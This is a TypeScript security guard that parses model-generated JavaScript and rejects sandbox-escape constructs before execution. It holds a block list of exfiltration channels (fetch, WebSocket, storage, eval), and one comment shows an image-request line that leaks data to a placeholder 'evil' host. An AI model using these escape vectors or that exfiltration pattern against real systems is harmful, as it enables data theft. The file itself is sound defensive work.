/**
 * guard.ts – static security check for model-generated JavaScript.
 *
 * ── Threat model ─────────────────────────────────────────────────────────────
 *
 * The model writes JavaScript that we execute in the browser against the host
 * app's API object. The code runs inside `with (api) { ... }`, which makes the
 * API functions look like globals. `with` is ergonomics, never security.
 *
 * The guard parses the code with acorn and rejects it *before* the first
 * statement runs if it contains a known escape vector. It is a blocklist: it
 * names what is forbidden and lets everything else through.
 *
 * ── Why a blocklist ──────────────────────────────────────────────────────────
 *
 * The obvious alternative is an allowlist of identifiers: resolve every name
 * against the host API's keys plus a few safe built-ins, reject the rest. It
 * fails closed on unknown globals, which is strictly stronger — but it needs to
 * know the API's names, and in a real app it cannot:
 *
 *   • The API surface is a deep object tree (`app.model.features[i].params`),
 *     not a flat list of functions.
 *   • It is built at runtime, grows during the session, or hides behind getters
 *     and proxies, so `Object.keys(api)` is incomplete the moment it is taken.
 *
 * An allowlist that does not know the real surface rejects legitimate calls,
 * and a guard that blocks the app's own API is worse than useless: the model
 * cannot work, and the developer's fix is to weaken the guard.
 *
 * So the guard restricts *language constructs*, not the app's vocabulary, and
 * the security boundary moves where it belongs: to the API object. See "Limits".
 *
 * ── What it blocks ───────────────────────────────────────────────────────────
 *
 *   1. `this`               → globalThis in sloppy mode
 *   2. `.constructor`       → Function("return globalThis")()
 *   3. prototype walking    → .prototype, .__proto__, getPrototypeOf, …
 *   4. `import()`           → the module system
 *   5. dangerous globals    → window, document, fetch, Image, localStorage, …
 *   6. computed obfuscation → obj["constr" + "uctor"]
 *
 * ── Limits – read this ───────────────────────────────────────────────────────
 *
 * A blocklist is incomplete by construction: every global nobody thought of is
 * reachable. Treat the guard as a strong barrier against a model that goes off
 * the rails, not as a sandbox that contains an adversary. The real boundary is
 * the API object you hand to createEvaluator: the model can do what your API
 * can do. Put nothing in it you would not let the user do — and remember that
 * any *other* execution path in your app (a scripting feature, an eval-based
 * plugin system) is a path around this guard entirely.
 */
import * as acorn from "acorn";

export interface GuardOptions {
  /** Identifiers to reject on top of the built-in list, e.g. your own globals. */
  extraBlocked?: string[];
  /** Names to permit despite being blocked by default. Use sparingly. */
  allowBlocked?: string[];
  /** Max source length in characters (default 10000). */
  maxLength?: number;
  /** Max AST nodes, a cheap ceiling on complexity (default 2500). */
  maxNodes?: number;
}

export interface GuardResult {
  ok: boolean;
  /** Why the code was rejected. Written for the model – it is fed back verbatim. */
  reason?: string;
  /** Position in the original source (1-based line, 0-based column). */
  at?: { line: number; column: number };
}

/** Language constructs with no legitimate use here and a proven escape history. */
const BLOCKED_NODES: Record<string, string> = {
  ThisExpression: "`this` is not available – call the API functions directly.",
  ImportExpression: "Dynamic import() is not allowed.",
  MetaProperty: "`import.meta` / `new.target` are not allowed.",
  WithStatement: "`with` is not allowed.",
  TaggedTemplateExpression: "Tagged templates are not allowed – use plain strings.",
  DebuggerStatement: "`debugger` is not allowed.",
};

/**
 * Identifiers that must never be referenced. Two groups: names that reach the
 * function constructor (and thus arbitrary code), and names that reach the
 * outside world (network, storage, DOM) – the exfiltration channels.
 */
const BLOCKED_IDENTIFIERS = new Set([
  // ── Scope escape / code generation ───────────────────────────────────────
  "arguments",
  "eval",
  "Function",
  "AsyncFunction",
  "GeneratorFunction",
  "AsyncGeneratorFunction",
  "constructor",
  "Proxy",
  "Reflect",
  "WebAssembly",

  // ── The global object, by any of its names ───────────────────────────────
  "globalThis",
  "window",
  "self",
  "global",
  "top",
  "parent",
  "opener",
  "frames",

  // ── DOM / browsing context ───────────────────────────────────────────────
  "document",
  "location",
  "navigator",
  "history",
  "customElements",

  // ── Network: the channels that turn a bug into a data leak ───────────────
  "fetch",
  "XMLHttpRequest",
  "WebSocket",
  "EventSource",
  "Image", // new Image().src = "https://evil/?" + data
  "Audio",
  "Worker",
  "SharedWorker",
  "BroadcastChannel",
  "MessageChannel",
  "RTCPeerConnection",
  "postMessage",
  "importScripts",
  "open", // window.open

  // ── Storage ──────────────────────────────────────────────────────────────
  "localStorage",
  "sessionStorage",
  "indexedDB",
  "caches",
  "cookieStore",

  // ── Timers: setTimeout("code") evaluates its string argument ─────────────
  "setTimeout",
  "setInterval",
  "setImmediate",

  // ── Native dialogs – the model must talk through the chat, not a popup ───
  "alert",
  "confirm",
  "prompt",
  "print",

  // ── Module systems ───────────────────────────────────────────────────────
  "require",
  "module",
  "exports",
  "process",
]);

/**
 * Property names that walk from any value back to the Function constructor,
 * and from there to arbitrary code. Blocked in both `a.b` and `a["b"]` form.
 */
const BLOCKED_PROPERTIES = new Set([
  "constructor",
  "prototype",
  "__proto__",
  "getPrototypeOf",
  "setPrototypeOf",
  "__defineGetter__",
  "__defineSetter__",
  "__lookupGetter__",
  "__lookupSetter__",
]);

// The code is wrapped so that top-level `return` and `await` parse. The wrapper
// ends in a newline, so the guarded code starts on line 2 and columns are exact.
const WRAPPER_PREFIX = "(async function __checked__() {\n";

/**
 * Checks model-generated code and reports whether it is safe to execute.
 * Never throws: a parse error is reported as a rejection, because that is a
 * message the model can act on.
 */
export function guardCode(source: string, options: GuardOptions = {}): GuardResult {
  const { extraBlocked = [], allowBlocked = [], maxLength = 10_000, maxNodes = 2500 } = options;

  if (typeof source !== "string") {
    return { ok: false, reason: "Code must be a string." };
  }
  if (source.length > maxLength) {
    return {
      ok: false,
      reason:
        `Code is too long (${source.length} characters, limit ${maxLength}). ` +
        `Split the work into several smaller calls.`,
    };
  }

  let ast: acorn.Node;
  try {
    ast = acorn.parse(WRAPPER_PREFIX + source + "\n})", {
      ecmaVersion: 2022,
      sourceType: "script",
      locations: true,
    });
  } catch (error: any) {
    return { ok: false, reason: `Syntax error: ${error?.message ?? String(error)}` };
  }

  const blocked = new Set(BLOCKED_IDENTIFIERS);
  for (const name of extraBlocked) blocked.add(name);
  for (const name of allowBlocked) blocked.delete(name);

  try {
    new Checker(blocked, maxNodes).visit(ast, null, new Scope(null));
    return { ok: true };
  } catch (violation) {
    if (violation instanceof Violation) {
      return { ok: false, reason: violation.reason, at: violation.at };
    }
    throw violation;
  }
}

// ── Scope tracking ────────────────────────────────────────────────────────────

type Node = any;

/**
 * A blocked name only means the *global* of that name. `open`, `parent`, `top`
 * and `self` are ordinary variable names, and the model will use them:
 *
 *   const open = tasks.filter((t) => !t.done);   // nothing to do with window.open
 *
 * So the guard tracks what the code declares. A blocked identifier is only a
 * violation when it is a *free* reference – nothing in an enclosing scope
 * declares it. A locally declared name cannot reach the global it shadows, so
 * allowing it is safe, and rejecting it would be a false positive on ordinary
 * code – the failure mode that makes developers turn a guard off.
 */
class Scope {
  readonly names = new Set<string>();
  constructor(readonly parent: Scope | null) {}

  declare(name: string) {
    this.names.add(name);
  }

  has(name: string): boolean {
    for (let scope: Scope | null = this; scope; scope = scope.parent) {
      if (scope.names.has(name)) return true;
    }
    return false;
  }
}

class Checker {
  private count = 0;

  constructor(
    private readonly blocked: Set<string>,
    private readonly maxNodes: number
  ) {}

  visit(node: Node, parent: Node, scope: Scope): void {
    if (!node || typeof node !== "object" || typeof node.type !== "string") return;

    if (++this.count > this.maxNodes) {
      throw new Violation(
        `Code is too complex (over ${this.maxNodes} syntax nodes). Keep it simple and split the work.`,
        node
      );
    }

    const blockedNode = BLOCKED_NODES[node.type];
    if (blockedNode) throw new Violation(blockedNode, node);

    if (
      node.type === "Identifier" &&
      this.blocked.has(node.name) &&
      isReference(node, parent) &&
      !scope.has(node.name)
    ) {
      throw new Violation(
        `"${node.name}" is not allowed. Use only the documented API functions and plain JavaScript.`,
        node
      );
    }

    if (node.type === "MemberExpression") checkMemberAccess(node);

    if (isFunction(node)) {
      const inner = new Scope(scope);
      if (node.id?.name) inner.declare(node.id.name);
      for (const param of node.params ?? []) declarePattern(param, inner);
      if (node.body?.type === "BlockStatement") {
        hoistVars(node.body, inner); // `var` and function declarations, function-wide
      }
      this.visitChildren(node, inner);
      return;
    }

    if (node.type === "BlockStatement" || isLoop(node) || node.type === "SwitchStatement") {
      const inner = new Scope(scope);
      declareBlockBindings(node, inner);
      this.visitChildren(node, inner);
      return;
    }

    if (node.type === "CatchClause") {
      const inner = new Scope(scope);
      if (node.param) declarePattern(node.param, inner);
      this.visitChildren(node, inner);
      return;
    }

    if (node.type === "VariableDeclarator") {
      // `const open = …` at the current level: declare before the initialiser is
      // visited, so `const parent = node.parent` does not trip on its own name.
      declarePattern(node.id, scope);
    }

    this.visitChildren(node, scope);
  }

  private visitChildren(node: Node, scope: Scope): void {
    for (const key of Object.keys(node)) {
      if (key === "type" || key === "loc" || key === "start" || key === "end") continue;
      const child = node[key];
      if (Array.isArray(child)) {
        for (const item of child) this.visit(item, node, scope);
      } else {
        this.visit(child, node, scope);
      }
    }
  }
}

/** Declares `let`/`const`/`class`/`function` of one block, plus loop bindings. */
function declareBlockBindings(block: Node, scope: Scope): void {
  const statements = Array.isArray(block.body) ? block.body : [];
  for (const statement of statements) {
    if (statement?.type === "VariableDeclaration") {
      for (const declarator of statement.declarations) declarePattern(declarator.id, scope);
    } else if (
      statement?.type === "FunctionDeclaration" ||
      statement?.type === "ClassDeclaration"
    ) {
      if (statement.id?.name) scope.declare(statement.id.name);
    }
  }
  // for (const item of list) / for (let i = 0; …)
  for (const part of [block.left, block.init]) {
    if (part?.type === "VariableDeclaration") {
      for (const declarator of part.declarations) declarePattern(declarator.id, scope);
    }
  }
}

/**
 * Hoists `var` and function declarations to the function scope, without
 * descending into nested functions – those have their own.
 */
function hoistVars(node: Node, scope: Scope): void {
  if (!node || typeof node !== "object" || typeof node.type !== "string") return;
  if (isFunction(node)) return;

  if (node.type === "VariableDeclaration" && node.kind === "var") {
    for (const declarator of node.declarations) declarePattern(declarator.id, scope);
  }
  if (node.type === "FunctionDeclaration" && node.id?.name) {
    scope.declare(node.id.name);
  }

  for (const key of Object.keys(node)) {
    if (key === "type" || key === "loc" || key === "start" || key === "end") continue;
    const child = node[key];
    if (Array.isArray(child)) {
      for (const item of child) hoistVars(item, scope);
    } else {
      hoistVars(child, scope);
    }
  }
}

/** Declares every binding a destructuring pattern introduces. */
function declarePattern(pattern: Node, scope: Scope): void {
  if (!pattern || typeof pattern !== "object") return;
  switch (pattern.type) {
    case "Identifier":
      scope.declare(pattern.name);
      return;
    case "ObjectPattern":
      for (const property of pattern.properties) {
        declarePattern(property.type === "RestElement" ? property.argument : property.value, scope);
      }
      return;
    case "ArrayPattern":
      for (const element of pattern.elements) declarePattern(element, scope);
      return;
    case "AssignmentPattern":
      declarePattern(pattern.left, scope);
      return;
    case "RestElement":
      declarePattern(pattern.argument, scope);
      return;
  }
}

function isFunction(node: Node): boolean {
  return (
    node.type === "FunctionDeclaration" ||
    node.type === "FunctionExpression" ||
    node.type === "ArrowFunctionExpression"
  );
}

function isLoop(node: Node): boolean {
  return (
    node.type === "ForStatement" ||
    node.type === "ForOfStatement" ||
    node.type === "ForInStatement"
  );
}

/**
 * Property access is where the constructor chain lives.
 *
 * Static:    obj.constructor            → checked against BLOCKED_PROPERTIES
 * Computed:  obj[0], obj[i], obj["key"] → allowed (string literals are checked)
 *            obj["constr" + "uctor"]    → rejected: a key computed from an
 *            obj[keys[j]], obj[fn()]      expression can spell out anything at
 *                                         runtime, so it cannot be checked here.
 *
 * If the model genuinely needs a dynamic lookup over an app object tree, expose
 * a helper on the API (`getProperty(obj, name)`) that validates the name.
 */
function checkMemberAccess(node: Node): void {
  if (!node.computed) {
    const name = node.property?.name;
    if (name && BLOCKED_PROPERTIES.has(name)) {
      throw new Violation(`Accessing .${name} is not allowed.`, node.property);
    }
    return;
  }

  const key = node.property;
  if (key?.type === "Literal") {
    if (typeof key.value === "number") return;
    if (typeof key.value === "string") {
      if (BLOCKED_PROPERTIES.has(key.value)) {
        throw new Violation(`Accessing ["${key.value}"] is not allowed.`, key);
      }
      return;
    }
  }
  if (key?.type === "Identifier") return; // items[i] – the identifier is checked on its own

  throw new Violation(
    'Computed property access must be a plain name, number or string literal ' +
      '(items[i], items[0], obj["name"]) – not an expression.',
    key ?? node
  );
}

/**
 * True when an identifier is used as a *name in its own right* rather than as a
 * property, an object key or a label. `task.location` is a field on the app's
 * data and has nothing to do with the global `location`, so it must not trip
 * the blocklist – the BLOCKED_PROPERTIES check covers the dangerous ones.
 */
function isReference(node: Node, parent: Node): boolean {
  if (!parent) return true;

  switch (parent.type) {
    case "MemberExpression":
      return parent.computed || parent.property !== node;
    case "Property":
      // `{ shorthand }` is key and value at once – still a reference.
      return parent.computed || parent.key !== node || parent.shorthand;
    case "MethodDefinition":
    case "PropertyDefinition":
      return parent.computed || parent.key !== node;
    case "LabeledStatement":
    case "BreakStatement":
    case "ContinueStatement":
      return parent.label !== node;
    default:
      return true;
  }
}

class Violation {
  readonly at?: { line: number; column: number };
  constructor(readonly reason: string, node: Node) {
    const start = node?.loc?.start;
    // Line 1 is the wrapper, so the model's own code starts on line 2.
    if (start) this.at = { line: Math.max(1, start.line - 1), column: start.column };
  }
}
